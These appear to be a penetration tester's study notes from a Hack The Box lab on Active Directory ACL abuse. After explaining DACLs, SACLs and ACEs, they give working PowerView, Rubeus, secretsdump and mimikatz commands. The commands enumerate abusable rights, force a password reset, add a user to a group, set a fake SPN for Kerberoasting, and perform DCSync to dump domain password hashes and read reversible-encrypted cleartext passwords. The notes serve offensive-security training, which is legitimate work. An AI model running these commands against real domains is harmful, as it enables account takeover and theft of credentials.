## What are ACLs 
Lists that define who has access to what assets/ resource.
The Rules By themselves are called Access Control Entities 
#### Types of ACLs
1. Discretionary Access Control List (DACL)
	Defines which security principals are granted or denied access to an object.
	When a user requests access to an object the system checks for a DACL, without it, the user is given full rights. 
	If a DACL exists but does not have entries the system will deny access to all users.
	![[DACL settings.png]]
1. System Access Control List (SACL)
	Allow administrators to log access attempts made to secured objects. 
	![[Security Settingss.png]]
#### Access Control Entities 
|**ACE**|**Description**|
|---|---|
|`Access denied ACE`|Used within a DACL to show that a user or group is explicitly denied access to an object|
|`Access allowed ACE`|Used within a DACL to show that a user or group is explicitly granted access to an object|
|`System audit ACE`|Used within a SACL to generate audit logs when a user or group attempts to access an object. It records whether access was granted or not and what type of access occurred|
##### Format of a ACE 
1. Security Identifier (SID) of the user/group that has access to the object
2. A Flag for denoting the type of ACE (table above)
3. A set of flags specify whether or not a child containers/ objects can inherit the given ACE 
4. An [access mask](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/7a53f60e-e730-4dfe-bbe9-b21b62eb790b?redirectedfrom=MSDN) which is a 32 bit value that defines the rights granted to an object. 
### Importance of ACEs
Attackers can utilise ACE entries to either further access or establish persistence.
They cannot be detected by vulnerability scanning tools and can go unchecked for many years. 

Can be viewed with BloodHound and abusable with Power View 
- `ForceChangePassword` abused with `Set-DomainUserPassword`
- `Add Members` abused with `Add-DomainGroupMember`
- `GenericAll` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
- `GenericWrite` abused with `Set-DomainObject`
- `WriteOwner` abused with `Set-DomainObjectOwner`
- `WriteDACL` abused with `Add-DomainObjectACL`
- `AllExtendedRights` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
- `Addself` abused with `Add-DomainGroupMember`
### Possible ACE attack methods 
![[Writeing DACL.png]]
## ACL Enumeration
### PowerView
Very Time consuming:
```powershell
Find-InterestingDomainAcl
```
Use a User that we have Control over:
```powershell
Import-Module .\PowerView.ps1

$sid = Convert-NameToSid <user>

Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

Google Object ACE Type.  or do a Reverse Search:
```powershell
 $guid= "00299570-246d-11d0-a768-00aa006e0529"
```

```powershell
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
```
**Reverse Search with PowerView**
```powershell
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
```
**Make a List of Domain Users**
```powershell
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```
**Useful Foreach Loop**
Read the File from before
```powershell
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\<USERNAME CHANGE>'}}
```

***Loop Through this process as needed***
## Abusing ACL 
### Example Attack
#### Authenticate as the initial user
```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\<user>', $SecPassword) 
```
#### Leverage GenericAll right
Create a secure string that will represent the password for the target user 
```powershell
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

Change the Users Password
```powershell
 Import-Module .\PowerView.ps1
```

```powershell
 Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```
#### Authenticate as new user
```powershell
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
```
#### Add User to the target group
List users 
```powershell
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
```

```powershell
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```
Confirm addition 
```powershell
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```

#### Perform kerbroasting on target user 
Create a fake SPN 
```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

```powershell
.\Rubeus.exe kerberoast /user:adunn /nowrap
```
Crack the hash

#### Clean up 
Remove the fake SPN 
```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```
Remove the user from the group 
```powershell
PS C:\htb> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```

```powershell
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
```
Reset the password 

## DCSync
### Description
Technique for stealing AD password databases using the Directory Replication Service Remote Protocol
Allows an attacker to mimic a DC to retrieve NTLM 

Need to have rights to perform domain replication.
	Replicating Directory Changes and Replicating Directory Changes All permissions set.
	Domain/Enterprise Admins and default domain administrators have this right by default.
### View Rights 
![[DC Permissons.png]]

```powershell
Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
```
**or**
Do this in powerview using [Get-ObjectACL](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainObjectAcl/)
```powershell
$sid= "<users SID>"
```

```powershell
> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

### Extracting Hashes using Secrets Dump
```shell
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
```
Optional flags:
	-just-dc-ntlm
	-just-dc-user
	-pwd-last-set
	-history
	-user-status

If we see ..cleartext, this is accounts with [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption)
Key to decrypt the RC4 is stored in the [registry](https://learn.microsoft.com/en-us/windows-server/security/kerberos/system-key-utility-technical-overview)
#### View users with reversible encryption
```powershell
 Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```
Check for options
```powershell
 Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```
Display the password 
```shell
cat inlanefreight_hashes.ntds.cleartext 
```
### Using MimiKatz
```cmd
.\mimikatz.exe
```

```cmd
sadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```
